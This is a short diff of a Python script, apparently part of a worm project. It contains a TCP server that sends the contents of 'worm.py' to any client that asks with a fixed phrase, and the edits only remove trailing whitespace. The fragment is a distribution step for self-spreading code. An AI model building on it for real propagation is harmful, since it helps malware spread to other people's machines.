@@ -4,7 +4,7 @@ import socket
 import sys
 
 if __name__ == '__main__':
-    
+
     host = "0.0.0.0"
     port = int(sys.argv[1])
 
@@ -15,10 +15,10 @@ if __name__ == '__main__':
 
     try:
         while True:
-            conn, addr = s.accept() 
+            conn, addr = s.accept()
             data = conn.recv(1024)
-            
-            if data.decode() == "give your py to me":    
+
+            if data.decode() == "give your py to me":
                 with open("worm.py", "r") as file:
                     encode_data = file.read().encode()
                     conn.sendall(encode_data)
